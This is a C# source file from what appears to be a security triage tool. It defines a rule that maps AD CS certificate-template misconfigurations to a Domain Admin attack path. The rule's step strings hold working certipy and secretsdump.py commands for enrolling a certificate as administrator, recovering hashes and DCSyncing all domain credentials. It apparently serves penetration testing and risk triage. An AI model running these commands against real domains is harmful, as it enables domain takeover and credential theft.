using ZeroDayTriage.Core.Abstractions;
using ZeroDayTriage.Core.Model;

namespace ZeroDayTriage.Reasoning.Rules;

/// <summary>
/// AD CS misconfigurations (ESC1–ESC8) typically yield a direct path to Domain Admin by
/// enrolling a certificate that authenticates as a privileged principal. Certipy detections
/// become Critical, crown-jewel paths.
/// </summary>
public sealed class AdcsEscalationRule : IAttackPathRule
{
    public string Id => "AD-ADCS";

    public string Description => "Vulnerable certificate template (ESCx) -> enroll as DA -> DCSync.";

    public AssetDomain Domain => AssetDomain.ActiveDirectory;

    public IEnumerable<AttackPath> Evaluate(FindingCorpus findings)
    {
        foreach (var f in findings.WithTag("adcs"))
        {
            var esc = f.Property("esc") ?? f.Tags.FirstOrDefault(t => t.StartsWith("esc", StringComparison.OrdinalIgnoreCase)) ?? "ESC";
            var template = f.Property("template") ?? f.Principal ?? "<template>";

            yield return new AttackPath
            {
                Name = $"AD CS {esc} via {template}",
                Objective = "Domain Admin via certificate abuse",
                Domain = AssetDomain.ActiveDirectory,
                Impact = Severity.Critical,
                Confidence = f.Confidence,
                Rationale =
                    $"Template {template} is vulnerable to {esc} -> request a certificate that " +
                    "authenticates as a Domain Admin, then DCSync. Often the fastest route to DA.",
                Steps = new[]
                {
                    new AttackStep
                    {
                        Action = $"Enroll an authentication certificate via {esc} on {template}.",
                        Tooling = $"certipy req -ca <CA> -template {template} -upn administrator@<DOMAIN>",
                        Phase = KillChainPhase.Exploit,
                        Technique = "T1649",
                        EvidenceFindingIds = new[] { f.Id },
                    },
                    new AttackStep
                    {
                        Action = "Authenticate with the certificate to recover the NT hash / TGT.",
                        Tooling = "certipy auth -pfx administrator.pfx -dc-ip <DC>",
                        Phase = KillChainPhase.Exploit,
                        Technique = "T1550.003",
                        EvidenceFindingIds = new[] { f.Id },
                    },
                    new AttackStep
                    {
                        Action = "DCSync the domain to dump krbtgt and all hashes.",
                        Tooling = "secretsdump.py -just-dc <DOMAIN>/administrator@<DC>",
                        Phase = KillChainPhase.LootAndPivot,
                        Technique = "T1003.006",
                        EvidenceFindingIds = new[] { f.Id },
                    },
                },
            };
        }
    }
}
